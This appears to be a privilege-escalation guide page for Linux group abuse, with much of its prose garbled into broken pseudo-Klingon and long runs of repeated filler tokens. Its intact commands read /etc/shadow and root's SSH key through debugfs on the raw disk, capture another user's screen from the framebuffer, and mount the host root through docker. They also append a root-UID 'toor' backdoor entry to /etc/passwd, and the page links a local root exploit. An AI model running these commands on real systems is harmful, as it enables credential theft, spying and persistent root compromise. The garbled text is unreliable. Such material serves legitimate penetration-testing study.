**'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **
```
%wheel	ALL=(ALL:ALL) ALL
```
**qaStaHvIS wheel ghItlhlaHbe'chugh sudo**.

**qaStaHvIS root boqHa'**:
```
sudo su
```
## qo'noS ghoS

**qo'noS ghoS** ghompu' **qatlh** **/etc/shadow** file:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, **ghItlh** vItlhutlh **hashes** **ghItlh** **crack**.

## Disk Group

**root access** **equivalent** **privilege** **ghItlh** **almost** **tlhIngan** **vItlhutlh** **ghItlh** **machine** **data** **ghItlh** **access** **'ej**.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
**ghItlhvam** debugfs **DIvI'** **tlhIngan Hol** **ghItlhvam** **'oH**. **'ej** `/tmp/asd1.txt` **ghItlhvam** `/tmp/asd2.txt` **ghItlhvam** **'e'** **tlhIngan Hol** **ghItlhvam** **DIvI'** **tlhIngan Hol** **ghItlhvam** **'oH**.
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
**However, if you try to write files owned by root** (like `/etc/shadow` or `/etc/passwd`) you will have a "**Permission denied**" error.

## Video Group

Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** **yossi** **logh** **mInDu'** **mach** **terminal** **user**.

**video** **ghom** **qawHaq** **ghItlh**. **screens** **observe** **jatlh** **raw data** **grab** **screen** **image** **current** **resolution** **get**. **screen data** `/dev/fb0` **save** **able** **screen** **resolution** `/sys/class/graphics/fb0/virtual_size` **find**.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**ghItlh** **raw image** **vItlhutlh** **GIMP** **vIlegh**, **`screen.raw`** **file** **vIlegh** **'ej** **Raw image data** **file type** **vIlegh**:

![](<../../../.gitbook/assets/image (287) (1).png>)

**'ej** **Width** **'ej Height** **vItlhutlh** **vIlegh** **'ej** **Image Types** **chel** **(latlh)** **'ej** **vItlhutlh** **'ej** **screen** **vItlhutlh** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

**vItlhutlh** **Docker Group** **chaw'** **root filesystem** **host machine** **instance's volume** **mount** **'e'** **'ej** **instance** **start** **'e'** **chroot** **volume** **'e'** **load**. **'ej** **'oH** **root** **machine** **'e'** **ghItlh**.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd Group

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm Group

Usually **members** of the group **`adm`** have permissions to **read log** files located inside _/var/log/_.\
Therefore, if you have compromised a user inside this group you should definitely take a **look to the logs**.

## Auth group

Inside OpenBSD the **auth** group usually can write in the folders _**/etc/skey**_ and _**/var/db/yubikey**_ if they are used.\
These permissions may be abused with the following exploit to **escalate privileges** to root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
